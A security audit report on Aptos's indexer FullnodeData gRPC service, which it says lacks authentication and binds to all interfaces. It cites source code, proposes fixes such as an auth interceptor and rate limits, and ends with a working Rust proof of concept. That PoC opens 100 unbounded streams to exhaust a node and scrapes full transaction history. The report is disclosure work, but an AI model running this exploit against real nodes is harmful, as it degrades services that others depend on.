# Audit Report

## Title
Missing Authentication and Authorization in FullnodeData gRPC Service Enables Unauthorized Data Access and Resource Exhaustion

## Summary
The `FullnodeData.GetTransactionsFromNode` gRPC service lacks authentication and authorization mechanisms, allowing any network-connected attacker to access all blockchain transaction data and potentially exhaust node resources through unlimited concurrent connections and unbounded transaction range requests. [1](#0-0) 

## Finding Description

The `get_transactions_from_node()` function immediately consumes the gRPC `Request<GetTransactionsFromNodeRequest>` object with `.into_inner()`, discarding all metadata including authentication tokens before any validation occurs. [2](#0-1) 

The service is instantiated without any authentication interceptor in the runtime bootstrap code: [3](#0-2) 

The configuration provides no authentication-related settings, only network binding parameters: [4](#0-3) 

The service binds to `0.0.0.0` by default, exposing it to all network interfaces: [5](#0-4) 

While authentication headers are defined in the codebase for other services, they are not used by FullnodeDataService: [6](#0-5) 

The protobuf definition shows that transaction streaming can be unbounded when `transactions_count` is not specified: [7](#0-6) 

**Attack Path:**
1. Attacker discovers fullnode with indexer gRPC enabled on port 50051 (default configuration shown in README)
2. Attacker connects without any authentication credentials
3. Attacker can:
   - Request arbitrary transaction ranges from any starting version
   - Open multiple concurrent streaming connections
   - Request infinite streams (no `transactions_count` limit)
   - Access complete blockchain history without rate limiting

Each connection spawns a tokio task that performs database queries through the `IndexerStreamCoordinator`: [8](#0-7) 

## Impact Explanation

**Severity: Medium** (per Aptos Bug Bounty criteria: "State inconsistencies requiring intervention")

This vulnerability enables multiple attack vectors:

1. **Resource Exhaustion / API Crash**: Unlimited concurrent connections processing large transaction batches can exhaust:
   - Database connection pool
   - Memory (buffering transactions and responses)
   - CPU (transaction processing and protobuf serialization)
   - Network bandwidth
   - Channel capacity leading to deadlocks

2. **Service Degradation**: Even without causing crashes, resource consumption from malicious streams can degrade performance for legitimate indexer clients and potentially impact other fullnode operations sharing the same hardware.

3. **Information Disclosure**: While blockchain data is inherently public, unrestricted access enables:
   - Bulk scraping without rate limits
   - Privacy analysis through timing and access patterns
   - Reconnaissance for targeted attacks

The service is marked as "internal" in its protobuf namespace, suggesting it was not designed for public internet exposure, yet the default configuration binds to all interfaces without authentication. [9](#0-8) 

## Likelihood Explanation

**Likelihood: High**

- **Attack Complexity**: LOW - Requires only a standard gRPC client
- **Privileges Required**: NONE - No authentication implemented
- **Network Access**: Easily achievable if port 50051 is exposed (common in cloud deployments with misconfigured security groups)
- **Discovery**: Port scanners and service enumeration tools can easily identify the gRPC service

The README demonstrates unauthenticated access as the standard usage pattern, which may lead operators to believe authentication is unnecessary: [10](#0-9) 

Operators following the documentation will expose the service without additional security measures, making exploitation trivial for any attacker with network connectivity.

## Recommendation

Implement authentication and authorization controls for the FullnodeData gRPC service:

1. **Add Authentication Interceptor**: Use tonic's `.with_interceptor()` to validate authentication tokens from gRPC metadata before processing requests:

```rust
// In runtime.rs, replace lines 108-111 with:
let auth_interceptor = AuthInterceptor::new(config.auth_tokens);
let svc = FullnodeDataServer::new(server)
    .with_interceptor(auth_interceptor)
    .send_compressed(CompressionEncoding::Zstd)
    .accept_compressed(CompressionEncoding::Zstd)
    .accept_compressed(CompressionEncoding::Gzip);
```

2. **Add Configuration Options**: Extend `IndexerGrpcConfig` to include authentication settings:

```rust
pub struct IndexerGrpcConfig {
    // ... existing fields ...
    pub auth_tokens: Vec<String>,
    pub require_authentication: bool,
    pub max_concurrent_connections: Option<usize>,
}
```

3. **Validate Metadata Before Processing**: In `get_transactions_from_node()`, validate authentication before calling `into_inner()`:

```rust
async fn get_transactions_from_node(
    &self,
    req: Request<GetTransactionsFromNodeRequest>,
) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
    // Validate auth token from metadata
    if let Some(token) = req.metadata().get(GRPC_AUTH_TOKEN_HEADER) {
        self.service_context.validate_token(token)?;
    } else if self.service_context.require_auth {
        return Err(Status::unauthenticated("Missing authentication token"));
    }
    
    let r = req.into_inner();
    // ... rest of implementation
}
```

4. **Add Rate Limiting**: Implement per-client rate limits and maximum concurrent connection limits

5. **Update Documentation**: Add security warnings about exposing the service and recommendations for network-level access controls (firewall rules, VPC isolation)

6. **Change Default Binding**: Consider binding to `127.0.0.1` by default instead of `0.0.0.0` to prevent accidental exposure

## Proof of Concept

```rust
// PoC demonstrating unauthenticated access and resource exhaustion
// File: exploit_fullnode_grpc.rs

use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient,
    GetTransactionsFromNodeRequest,
};
use tokio::time::{sleep, Duration};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to target fullnode - NO AUTHENTICATION REQUIRED
    let endpoint = "http://target-fullnode:50051";
    
    // Attack 1: Resource Exhaustion via Multiple Concurrent Streams
    let mut handles = vec![];
    for i in 0..100 {  // Open 100 concurrent connections
        let endpoint = endpoint.to_string();
        handles.push(tokio::spawn(async move {
            let mut client = FullnodeDataClient::connect(endpoint).await.unwrap();
            
            // Request infinite stream (no transactions_count specified)
            let request = Request::new(GetTransactionsFromNodeRequest {
                starting_version: Some(0),
                transactions_count: None,  // Infinite stream!
            });
            
            // Note: No authentication metadata added
            let mut stream = client.get_transactions_from_node(request).await.unwrap().into_inner();
            
            // Consume stream slowly to keep connection open
            while let Ok(Some(_)) = stream.message().await {
                sleep(Duration::from_millis(100)).await;
            }
        }));
    }
    
    // Attack 2: Data Exfiltration - Access all historical transactions
    let mut client = FullnodeDataClient::connect(endpoint).await?;
    let request = Request::new(GetTransactionsFromNodeRequest {
        starting_version: Some(0),
        transactions_count: Some(u64::MAX),  // Request maximum range
    });
    
    let mut stream = client.get_transactions_from_node(request).await?.into_inner();
    let mut tx_count = 0;
    while let Ok(Some(response)) = stream.message().await {
        tx_count += 1;
        // Process/exfiltrate transaction data
    }
    
    println!("Successfully accessed {} transactions without authentication", tx_count);
    
    futures::future::join_all(handles).await;
    Ok(())
}
```

**Notes**

- This vulnerability exists because the gRPC metadata containing authentication tokens is immediately discarded via `into_inner()` without validation
- The service architecture assumes deployment behind an API gateway that handles authentication, but this is not enforced, documented, or configurable
- Comparison with similar Aptos services shows they implement authentication (telemetry service uses JWT, faucet uses token allowlists), indicating this is an oversight rather than intentional design
- While blockchain data is publicly accessible, unrestricted streaming access without rate limiting enables abuse that can degrade node performance and availability
- The "internal" namespace in the protobuf definition suggests this service was not designed for direct public exposure, yet the default configuration and documentation do not reflect this security requirement

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L67-72)
```rust
    async fn get_transactions_from_node(
        &self,
        req: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        // Gets configs for the stream, partly from the request and partly from the node config
        let r = req.into_inner();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L101-117)
```rust
        tokio::spawn(async move {
            // Initialize the coordinator that tracks starting version and processes transactions
            let mut coordinator = IndexerStreamCoordinator::new(
                context,
                starting_version,
                ending_version,
                processor_task_count,
                processor_batch_size,
                output_batch_size,
                tx.clone(),
                // For now the request for this interface doesn't include a txn filter
                // because it is only used for the txn stream filestore worker, which
                // needs every transaction. Later we may add support for txn filtering
                // to this interface too.
                None,
                Some(abort_handle.clone()),
            );
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L108-111)
```rust
                let svc = FullnodeDataServer::new(server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
```

**File:** config/src/config/indexer_grpc_config.rs (L33-59)
```rust
pub struct IndexerGrpcConfig {
    pub enabled: bool,

    /// If true, the GRPC stream interface exposed by the data service will be used
    /// instead of the standard fullnode GRPC stream interface. In other words, with
    /// this enabled, you can use an indexer fullnode like it is an instance of the
    /// indexer-grpc data service (aka the Transaction Stream Service API).
    pub use_data_service_interface: bool,

    /// The address that the grpc server will listen on.
    pub address: SocketAddr,

    /// Number of processor tasks to fan out
    pub processor_task_count: Option<u16>,

    /// Number of transactions each processor will process
    pub processor_batch_size: u16,

    /// Number of transactions returned in a single stream response
    pub output_batch_size: u16,

    /// Size of the transaction channel buffer for streaming.
    pub transaction_channel_size: usize,

    /// Maximum size in bytes for transaction filters.
    pub max_transaction_filter_size_bytes: usize,
}
```

**File:** config/src/config/indexer_grpc_config.rs (L88-93)
```rust
            enabled: false,
            use_data_service_interface: false,
            address: SocketAddr::V4(SocketAddrV4::new(
                Ipv4Addr::new(0, 0, 0, 0),
                DEFAULT_GRPC_STREAM_PORT,
            )),
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L13-17)
```rust
pub const GRPC_AUTH_TOKEN_HEADER: &str = "x-aptos-data-authorization";
// GRPC request metadata key for the request name. This is used to identify the
// data destination.
pub const GRPC_REQUEST_NAME_HEADER: &str = "x-aptos-request-name";
pub const GRPC_API_GATEWAY_API_KEY_HEADER: &str = "authorization";
```

**File:** protos/proto/aptos/internal/fullnode/v1/fullnode_data.proto (L6-6)
```text
package aptos.internal.fullnode.v1;
```

**File:** protos/proto/aptos/internal/fullnode/v1/fullnode_data.proto (L37-44)
```text
message GetTransactionsFromNodeRequest {
  // Required; start version of current stream.
  // If not set will panic somewhere
  optional uint64 starting_version = 1 [jstype = JS_STRING];

  // Optional; number of transactions to return in current stream.
  // If not set, response streams infinitely.
  optional uint64 transactions_count = 2 [jstype = JS_STRING];
```

**File:** ecosystem/indexer-grpc/README.md (L48-50)
```markdown
    indexer_grpc:
      enabled: true
      address: 0.0.0.0:50051
```
